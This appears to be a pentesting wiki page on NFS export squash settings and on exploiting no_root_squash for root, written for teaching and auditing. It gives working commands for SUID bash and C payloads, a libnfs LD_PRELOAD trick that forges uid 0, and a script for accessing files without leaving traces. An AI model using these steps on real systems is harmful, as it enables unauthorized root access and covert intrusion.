{{#include ../../banners/hacktricks-training.md}}


# Squashing Basic Info

NFS will usually (specially in linux) trust the indicated `uid` and `gid` by the client conencting to access the files (if kerberos is not used). However, there are some configurations that can be set in the server to **change this behavior**:

- **`all_squash`**: It squashes all accesses mapping every user and group to **`nobody`** (65534 unsigned / -2 signed). Therefore, everyone is `nobody` and no users are used.
- **`root_squash`/`no_all_squash`**: This is default on Linux and **only squashes access with uid 0 (root)**. Therefore, any `UID` and `GID` are trusted but `0` is squashed to `nobody` (so no root imperonation is possible).
- **``no_root_squash`**: This configuration if enabled doesn't even squash the root user. This means that if you mount a directory with this configuration you can access it as root.

In the **/etc/exports** file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.

For more information about **NFS** check:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

Option 1 using bash:
- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
    - Note that to be root inside the NFS share, **`no_root_squash`** must be configured in the server.
    - However, if not enabled, you could escalate to other user by copying the binary to the NFS share and giving it the SUID permission as the user you want to escalate to.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 using c compiled code:
- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
    - Same restrictions as before

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

## Local Exploit

> [!NOTE]
> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
> The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
> Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
> --_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--

## Basic Information

The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.

### Compiling the Library

The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. The compilation process involves the following commands:

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

### Conducting the Exploit

The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:

1. **Compile the exploit code:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Place the exploit on the share and modify its permissions by faking the uid:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Execute the exploit to gain root privileges:**

```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell for Stealthy File Access

Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Run like:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

{{#include ../../banners/hacktricks-training.md}}



